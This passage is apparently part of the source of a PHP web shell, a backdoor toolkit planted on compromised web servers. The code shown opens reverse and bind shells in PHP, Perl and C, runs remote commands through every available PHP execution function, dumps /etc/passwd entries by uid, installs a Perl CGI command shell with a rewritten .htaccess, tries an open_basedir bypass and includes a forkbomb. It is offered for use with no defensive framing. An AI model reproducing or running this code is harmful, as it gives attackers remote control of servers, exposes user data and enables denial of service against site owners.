     if (!$sock) { printit("$errstr ($errno)"); exit(1); }
     $process = proc_open($shell, $descriptorspec, $pipes);
     if (!is_resource($process)) { printit("ERROR: Can't spawn shell<br>"); exit(1); }
     stream_set_blocking($pipes[0], 0);
     stream_set_blocking($pipes[1], 0);
     stream_set_blocking($pipes[2], 0);
     stream_set_blocking($sock, 0);
     printit("Successfully opened reverse shell to $ip:$port<br>");
     while (1) {
      if (feof($sock)) { printit("ERROR: Shell connection terminated<br>");     break; }
      if (feof($pipes[1])) { printit("ERROR: Shell process terminated<br>"); break;     }
      $read_a = array($sock, $pipes[1], $pipes[2]);
      $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
      if (in_array($sock, $read_a)) {
       $input = fread($sock, $chunk_size);
       fwrite($pipes[0], $input);
      }
      if (in_array($pipes[1], $read_a)) {
       $input = fread($pipes[1], $chunk_size);
       fwrite($sock, $input);
      }
      if (in_array($pipes[2], $read_a)) {
       $input = fread($pipes[2], $chunk_size);
       fwrite($sock, $input);
      }
     }
     fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);@proc_close($process);
    //php backconnect end
    break;
    case "phplocal":
     // code by metasploit.com. license unknown, assuming BSD
     @set_time_limit(0); 
     @ignore_user_abort(1); 
     @ini_set('max_execution_time',0); 
     $port=$_POST["port"]; 
     $scl='socket_create_listen';
     if (function_enabled($scl)) {
      $sock=@$scl($port); 
     } else { 
      $sock=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      $ret=@socket_bind($sock,0,$port);
     $ret=@socket_listen($sock,5); 
     }
     $msgsock=@socket_accept($sock);
     @socket_close($sock);
     while (FALSE !== @socket_select($r=array($msgsock), $w=NULL, $e=NULL, NULL)) {
      $buffer = '';
      $c=@socket_read($msgsock,2048,PHP_NORMAL_READ);
      if (FALSE === $c) { break; }
      if (substr($c,0,3) == 'cd ') {
       chdir(substr($c,3,-1));
      } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
       break;
      } else {
       if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) { $c=$c." 2>&1\n"; }
       if (function_enabled('shell_exec')) {
        $buffer=shell_exec($c);
       } else if(function_enabled('passthru')) {
        ob_start();
        passthru($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('system')) {
        ob_start();
        system($c);
        $buffer=ob_get_contents();
        ob_end_clean();
       } else if(function_enabled('exec')) {
        $buffer=array();
        exec($c,$buffer);
        $buffer=join(chr(10),$buffer).chr(10);
       } else if(function_enabled('proc_open')) {
        $handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes);
        $buffer=NULL;
        while (!feof($pipes[1])) {
         $buffer.=fread($pipes[1],1024);
        }
       @proc_close($handle);     
       } else if(function_enabled('popen')) {
        $fp=popen($c,'r');
        $buffer=NULL;
        if (is_resource($fp)) { 
         while (!feof($fp)) {
          $buffer.=fread($fp,1024);
         }
        }
        @pclose($fp);
       }
      else { $buffer=0; }
      }
      @socket_write($msgsock,$buffer,strlen($buffer));
     }
     @socket_close($msgsock);
     echo "<br><br><font color=\"green\">phplocal done</font>"; 
    break;
    //phpbind end
    case "perllocal1":
     $perl->eval($perlbdcode);
    break;
    case "perllocal2":
     $exec_path = trim($_POST['path']);
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else { 
      fwrite($fh,$perlbdcode);
      fclose($fh);
      chmod($exec_path,0644);
      //TODO: проверить все функции, passthru тупит
      $c=search("perl",$failflag).' '.$exec_path.'';
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">perllocal done</font>";
     }
    //perl bind end
    break;
    case "perlremote1":
     $perl->eval($perlbccode); 
    break;
    case "perlremote2":
     $exec_path=trim($_POST['path']);
     $fh=fopen($exec_path,'w');
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$perlbccode);
      fclose($fh);
      chmod($exec_path,0644);
      //TODO: проверить все функции, passthru тупит
      $c=search("perl",$failflag).' '.$exec_path.'';
      if (function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">perlremote done</font>";
     }
    break;
    //perl backconnect end
    case "clocal":
     $fh=fopen("bd.c","w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; } 
     else {
      fwrite($fh,$cbdcode);
      fclose($fh);
      $c=search("gcc",$failflag)." -w bd.c -o bd && rm -f bd.c && ./bd ".$_POST["port"]." | rm -f bd";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
      } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
      echo "<br><br><font color=\"green\">clocal done</font>";
     }
    break;
    //C bind end
    case "cremote":
     $fh=fopen("bc.c","w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$cbccode);
      fclose($fh);
      $c=search("gcc",$failflag)." bc.c -o bc && rm -f bc.c && ./bc ".$_POST["ip"]." ".$_POST["port"]." | rm -f bc";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
       } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
     }
    break;
    case "findsock":
     $fh=fopen("findsock.c","w");
     if (!$fh) { echo "<br><br><font color=\"red\">can`t fopen!</font>"; }
     else {
      fwrite($fh,$findsock);
      fclose($fh);
      $c=search("gcc",$failflag)." findsock.c -o findsock && rm -f findsock.c";
      if (function_enabled('shell_exec')) {
       shell_exec($c);
      } else if(function_enabled('passthru')) {
       passthru($c);
      } else if(function_enabled('system')) {
       system($c);
      } else if(function_enabled('exec')) {
       exec($c);
      } else if(function_enabled('proc_open')) {
       $handle=proc_open($c,$descriptorspec,$pipes);
       while (!feof($pipes[1])) {
        $buffer.=fread($pipes[1],1024);
       }
       @proc_close($handle);
       } else if(function_enabled('popen')) {
       $fp=popen($c,'r');
       @pclose($fp);
      }
     echo "<br>saved and compiled!<br>";
     }
    break;
   }
  }
  echo "</body></html>";
  break;
// --------------------------------------------- bind end; extras 
 case "e":
  echo $title;
  echo '<font color="blue">---> SysInfo</font><br>';
  echo '<font color="gray">httpd: '.getenv("SERVER_SOFTWARE").'<br>';
  echo "php API: ".php_sapi_name()."<br>";
  echo "php version: ".$version."<br>";
  sploent516();
  echo "<br>";
  echo "current dir: ".getcwd()."<br>"; //TODO: use sploents to remove open_basedir here
  echo "uname: ".wordwrap(php_uname(),90,"<br>",1)."<br>";
  echo "script owner: ".get_current_user()."<br>";
  if(function_enabled('posix_getpwuid')) { 
   $processUser = posix_getpwuid(posix_geteuid());
   echo "current user: ".$processUser['name']."<br>";
  } else {
   echo "posix_getpwuid disabled!<br>";
  }
  echo "<br></font>";
  echo '<font color="blue">---> Extraz</font><br><br>';
  if (!function_enabled('phpinfo')) { echo "fail, phpinfo() is disabled<br><br>"; 
  } else {
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">
    <input name="extraz" type="hidden" value="info"><input type="submit" value="phpinfo()"></form><br>';
  }
  if(function_enabled('posix_getpwuid')) {
   echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">"read" /etc/passwd from uid <input name="uid1" type="text" size="10" value="0"> to <input name="uid2" type="text" size="10" value="1000"> <input type="submit" value="go"><input name="uidz" type="hidden" value="done"></form>';
   if (!empty($_POST["uidz"])) {
    echo "<br>";
    //code by oRb. license unknown, assuming WTFPL
    for(;$_POST['uid1'] <= $_POST['uid2'];$_POST['uid1']++) {
     $uid = @posix_getpwuid($_POST['uid1']);
     if ($uid)
      echo join(':',$uid)."<br>\n";
     }
   }
  }
  echo '<br><form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e">put mini perl shell into <input name="dir" type="text" maxlength="100" size="10" style="color: green;" value="."><font color="green">/</font><input name="file" type="text" maxlength="100" size="10" style="color: green;" value="sh.pl"> adding .htaccess <input type="checkbox" name="htaccess"> <input type="submit" value="OK"><input name="extraz" type="hidden" value="perlsh"><br><font color="gray">warning: my .htaccess will <b>rewrite</b> current one!</font> </form>';
  if ($failflag=="1") {
   echo "can't find perl binary (all system functions disabled) assuming /usr/bin/perl<br>";
 }
  echo '<br><font color="blue">---> DoS</font><font color="gray"> //use this carefully</font><br><br>';
  echo '<form method="post" action="'.$_SERVER['PHP_SELF'].'?p=e"><input name="extraz" type="hidden" value="fork"><input type="submit" value="forkbomb"></form>';
  //
  if (!empty($_POST["extraz"])) {
   switch ($_POST["extraz"]) {
    case "fork":
     while(pcntl_fork()|1); 
     break;
    case "info":
     header('Location: '.$_SERVER['PHP_SELF'].'?p=pi');
     break;
    case "perlsh":
     //author/license unknown, assuming WTFPL 
     if ($failflag=="1") {
      $perlbin="/usr/bin/perl";
     } else {
      $perlbin=search("perl",$failflag);
     }
     $perlshcode='#!'.$perlbin.'
      use CGI qw/-no_xhtml :standard/;
      use CGI::Carp qw(fatalsToBrowser);
      print header(-charset => "utf-8"),
      start_html(-lang => "ru", -title => "");
      if ( param() ) {
      my $v = param("v");
      print $v, "<br>\n";
      my $timeout = 30;
      local $SIG{ALRM} = sub { close KAN;
      print " ";
      die "timeout"; };
      $pid = open(KAN, "$v 2>&1 |");
      die "can`t $!.\n" unless ($pid);
      eval {
      alarm($timeout);
      print "<br><textarea cols=\"80\" rows=\"25\">";
      while( <KAN> ) { print; }
      print "</textarea><br>";
      alarm(0);
      close KAN;
      }
      }
      print start_form,
      textfield(-name=>"v", -size=> 30, -value=> ""), submit("Go"),
      endform, end_html;
      exit(0);';
     $htaccess='Options +Indexes +FollowSymLinks +ExecCGI
AddType application/x-httpd-cgi .pl';
     if ( $version <= "5.2.9" ) { 
      echo "<br> trying php5.1.6 sploent...<br>:";
      sploent516();
     }
     $fh=fopen($_POST["dir"]."/".$_POST["file"],"w");
     if (!$fh) { echo "can`t fopen ".$_POST["dir"]."/".$_POST["file"]."!"; } 
     else {
      fwrite($fh,$perlshcode);
      fclose($fh);
      echo $_POST["file"]." write done, chmoding..<br>";
      $ch=chmod($_POST["dir"]."/".$_POST["file"], 0755);
			if (!$ch) {
       echo "chmod failed, make chmod 755 manually<br>";
      } else {
       echo "chmod done<br>";
      }
      if ($_POST["htaccess"] == "on") {
       $fh=fopen($_POST["dir"]."/.htaccess","w");
       fwrite($fh,$htaccess);
       fclose($fh);
       echo "htaccess done";
      }
     }
     break;
   }
  }
  break;
// extras end ###
 case "pi":
  phpinfo();
  break;
} 
// :)
?>
